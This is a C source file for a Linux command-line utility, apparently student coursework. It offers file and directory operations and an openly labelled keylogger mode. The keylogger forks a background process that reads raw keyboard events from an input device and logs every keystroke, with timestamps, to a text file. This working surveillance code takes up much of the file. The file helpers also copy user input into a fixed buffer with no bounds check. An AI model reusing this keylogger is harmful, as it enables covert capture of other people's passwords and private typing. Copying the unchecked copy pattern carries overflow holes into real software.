#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>
#include <string.h>
#include <time.h>
#include <linux/input.h>
#include <ctype.h>

// Function prototypes
void file_operations_cli(int argc, char *argv[]);
void directory_operations_cli(int argc, char *argv[]);
void keylogger_operations_cli(int argc, char *argv[]);
void run_keylogger();

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s -m <mode> <sub-operation> [arguments]\n", argv[0]);
        fprintf(stderr, "Modes:\n");
        fprintf(stderr, "  1: File Operations\n");
        fprintf(stderr, "  2: Directory Operations\n");
        fprintf(stderr, "  3: Keylogger Operations\n");
        return 1;
    }

    if (strcmp(argv[1], "-m") != 0) {
        fprintf(stderr, "Error: First argument must be '-m'\n");
        return 1;
    }

    int mode = atoi(argv[2]);
    switch (mode) {
        case 1: // File operations
            if (argc < 4) {
                fprintf(stderr, "Error: Missing sub-operation or arguments for file operations\n");
                return 1;
            }
            file_operations_cli(argc, argv);
            break;

        case 2: // Directory operations
            if (argc < 4) {
                fprintf(stderr, "Error: Missing sub-operation or arguments for directory operations\n");
                return 1;
            }
            directory_operations_cli(argc, argv);
            break;

        case 3: // Keylogger operations
            keylogger_operations_cli(argc, argv);
            break;

        default:
            fprintf(stderr, "Error: Invalid mode. Use 1, 2, or 3.\n");
            return 1;
    }

    return 0;
}

// File operations
void file_operations_cli(int argc, char *argv[]) {
    int sub_operation = atoi(argv[3]);

    char *filename;
    char data[1024];
    int fd, mode;

    switch (sub_operation) {
        case 1: // Create/Open a file
            if (argc < 5) {
                fprintf(stderr, "Error: Missing filename for file creation\n");
                return;
            }
            filename = argv[4];
            fd = open(filename, O_CREAT | O_RDWR, 0644);
            if (fd == -1) {
                perror("Error creating/opening file");
            } else {
                printf("File '%s' created/opened successfully.\n", filename);
                close(fd);
            }
            break;

        case 2: // Change file permissions
            if (argc < 6) {
                fprintf(stderr, "Error: Missing filename or mode for chmod\n");
                return;
            }
            filename = argv[4];
            mode = strtol(argv[5], NULL, 8);
            if (chmod(filename, mode) == -1) {
                perror("Error changing file permissions");
            } else {
                printf("Permissions of '%s' changed to %o successfully.\n", filename, mode);
            }
            break;

        case 3: // Read a file
            if (argc < 5) {
                fprintf(stderr, "Error: Missing filename to read\n");
                return;
            }
            filename = argv[4];
            fd = open(filename, O_RDONLY);
            if (fd == -1) {
                perror("Error opening file for reading");
            } else {
                read(fd, data, sizeof(data));
                printf("Content of '%s':\n%s\n", filename, data);
                close(fd);
            }
            break;

        case 4: // Write to a file
            if (argc < 6) {
                fprintf(stderr, "Error: Missing filename or data to write\n");
                return;
            }
            filename = argv[4];
            fd = open(filename, O_WRONLY | O_APPEND);
            if (fd == -1) {
                perror("Error opening file for writing");
            } else {
                strcpy(data, argv[5]);
                write(fd, data, strlen(data));
                printf("Data written to '%s' successfully.\n", filename);
                close(fd);
            }
            break;

        case 5: // Delete a file
            if (argc < 5) {
                fprintf(stderr, "Error: Missing filename to delete\n");
                return;
            }
            filename = argv[4];
            if (unlink(filename) == -1) {
                perror("Error deleting file");
            } else {
                printf("File '%s' deleted successfully.\n", filename);
            }
            break;

        default:
            fprintf(stderr, "Error: Invalid sub-operation for file operations\n");
    }
}

// Directory operations
void directory_operations_cli(int argc, char *argv[]) {
    int sub_operation = atoi(argv[3]);
char *dirname;


    switch (sub_operation) {

case 1: // Create a directory
            if (argc < 5) {
                fprintf(stderr, "Error: Missing directory name\n");
                return;
            }
            dirname = argv[4];
            if (mkdir(dirname, 0755) == -1) {
                perror("Error creating directory");
            } else {
                printf("Directory '%s' created successfully.\n", dirname);
            }
            break;

        case 2: // Delete a directory
            if (argc < 5) {
                fprintf(stderr, "Error: Missing directory name\n");
                return;
            }
            dirname = argv[4];
            if (rmdir(dirname) == -1) {
                perror("Error deleting directory");
            } else {
                printf("Directory '%s' deleted successfully.\n", dirname);
            }
            break;
        case 3: { // Print current directory
            char cwd[1024];
            if (getcwd(cwd, sizeof(cwd)) == NULL) {
                perror("Error getting current working directory");
            } else {
                printf("Current Directory: %s\n", cwd);
            }
            break;
        }

        case 4: { // List directory contents
            DIR *dir;
            struct dirent *entry;
            if ((dir = opendir(".")) == NULL) {
                perror("Error opening directory");
            } else {
                printf("Directory contents:\n");
                while ((entry = readdir(dir)) != NULL) {
                    printf("%s\n", entry->d_name);
                }
                closedir(dir);
            }
            break;
        }

        default:
            fprintf(stderr, "Error: Invalid sub-operation for directory operations\n");
    }
}

// Keylogger operations, done by Mohamad Aliff Hazwan Bin Osman (80063)
void keylogger_operations_cli(int argc, char *argv[]) {
    printf("Starting keylogger...\n");
    if (fork() == 0) {
        run_keylogger();
        exit(0);
    }
}


void run_keylogger() {

    const char *device = "/dev/input/event2"; 

    int fd = open(device, O_RDONLY);

    if (fd == -1) {

        perror("Error opening input device");

        exit(1);

    }



    struct input_event ev;

    FILE *keylog = fopen("keylog.txt", "a");

    if (!keylog) {

        perror("Error opening keylog.txt");

        close(fd);

        exit(1);

    }


    // Add a timestamp to the log

    time_t now = time(NULL);

    fprintf(keylog, "\nKeylogger session started at %s\n", ctime(&now));

    fflush(keylog);



    // Keymap for keycode-to-character mapping

    char *keymap[] = {

        [2] = "1", [3] = "2", [4] = "3", [5] = "4", [6] = "5",

        [7] = "6", [8] = "7", [9] = "8", [10] = "9", [11] = "0",

        [16] = "q", [17] = "w", [18] = "e", [19] = "r", [20] = "t",

        [21] = "y", [22] = "u", [23] = "i", [24] = "o", [25] = "p",

        [30] = "a", [31] = "s", [32] = "d", [33] = "f", [34] = "g",

        [35] = "h", [36] = "j", [37] = "k", [38] = "l",

        [44] = "z", [45] = "x", [46] = "c", [47] = "v", [48] = "b",

        [49] = "n", [50] = "m"

    };



    int shift_pressed = 0; // Track Shift key status

    int key_states[KEY_MAX] = {0}; // Array to track key states (0 = released, 1 = pressed)



    while (1) {

        if (read(fd, &ev, sizeof(struct input_event)) > 0) {

            // Handle Shift key press/release

            if (ev.type == EV_KEY && (ev.code == 42 || ev.code == 54)) { // Left or Right Shift

                shift_pressed = ev.value; // 1 = pressed, 0 = released

                fprintf(keylog, shift_pressed ? "[SHIFT_PRESSED] " : "[SHIFT_RELEASED] ");

                fflush(keylog);

            }



            // Handle other keys

            if (ev.type == EV_KEY && ev.value == 1) { // Key press event

                if (key_states[ev.code] == 0) { // Check if key is already pressed

                    key_states[ev.code] = 1; // Mark key as pressed



                    // Special key handling

                    switch (ev.code) {

                        case 1: fprintf(keylog, "[ESC] "); break;

                        case 28: fprintf(keylog, "[ENTER]\n"); break;

                        case 57: fprintf(keylog, "[SPACE] "); break;

                        case 14: fprintf(keylog, "[BACKSPACE] "); break;

                        case 29: fprintf(keylog, "[CTRL] "); break;

                        case 56: fprintf(keylog, "[ALT] "); break;

                        case 125: fprintf(keylog, "[FN] "); break;

                        case 103: fprintf(keylog, "[UP_ARROW] "); break;

                        case 108: fprintf(keylog, "[DOWN_ARROW] "); break;

                        case 105: fprintf(keylog, "[LEFT_ARROW] "); break;

                        case 106: fprintf(keylog, "[RIGHT_ARROW] "); break;

                        case 58: fprintf(keylog, "[CAPSLOCK] "); break;

                        default:

                            if (ev.code < sizeof(keymap) / sizeof(char *) && keymap[ev.code] != NULL) {

                                // Log regular keys

                                if (shift_pressed && isalpha(keymap[ev.code][0])) {

                                    fprintf(keylog, "%c", toupper(keymap[ev.code][0]));

                                } else {

                                    fprintf(keylog, "%s", keymap[ev.code]);

                                }

                            }

                            break;

                    }

                    fflush(keylog);

                }

            }



            // Handle key release

            if (ev.type == EV_KEY && ev.value == 0) { // Key release event

                key_states[ev.code] = 0; // Mark key as released

            }

        }

    }



    fclose(keylog);

    close(fd);

    printf("Keylogger stopped.\n");

}
